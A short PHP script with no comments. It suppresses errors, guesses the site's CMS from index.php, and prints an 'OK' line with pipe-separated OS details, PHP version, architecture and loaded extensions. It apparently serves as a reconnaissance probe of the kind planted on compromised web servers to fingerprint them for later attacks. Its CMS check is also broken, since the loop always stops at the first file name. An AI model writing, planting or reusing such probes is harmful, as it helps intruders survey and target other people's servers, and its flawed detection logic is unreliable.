<?php

@error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time', 0);

function read_file($filename)
{
	$file_data = '';
	if (@file_exists($filename))
	{
		$fp = @fopen($filename, 'r');
		if ($fp)
		{
			$file_data = @file_get_contents($filename);
			fclose($fp);
		}
	}

	return $file_data;
}

function detect_cms()
{
	$index_list = array(   
	    'index.php',
	    'index.php3',
		'index.htm',
	    'index.html',
	    'index.phtm',
	    'index.phtml',
	    'index.asp',
	    'index.shtm',
	    'index.shtml'
	);

	$cms_list = array(
		array('JFactory::', 'Joomla!'),
		array('drupal_bootstrap', 'Drupal'),
		array('wp-blog-header.php', 'Wordpress'),
		array('$modx', 'MODX'),
		array('typo3', 'TYPO3'),
		array('textpattern()', 'Textpattern'),
		array('IMAGECMS', 'ImageCMS')
	);

	foreach ($index_list as $index_file)
	{
		$index_data = read_file($index_file);
		if (strlen($index_file))
		{
			break;
		}
	}

	foreach ($cms_list as $cms_item)
	{
		if (strpos($index_data, $cms_item[0]) !== false)
		{
			return $cms_item[1];
		}
	}

	return '';	
}

echo 'OK';
echo detect_cms().'|';

if (function_exists('php_uname'))
{
	echo @php_uname('s').'|'.
		 @php_uname('r').'|'.
		 @php_uname('v').'|'.
		 @php_uname('m').'|';
} else
{
	echo '||||';
}

if (defined('PHP_INT_SIZE') && PHP_INT_SIZE == 8)
{
	echo '64|';
} else
{
	echo '32|';
}

if (function_exists('phpversion'))
{
	echo @phpversion().'|';
} else
{
	echo '|';
}

if (function_exists('get_loaded_extensions'))
{
	$extensions = @get_loaded_extensions();
	foreach ($extensions as $ext)
	{
		echo $ext.'|';
	}
}

?>
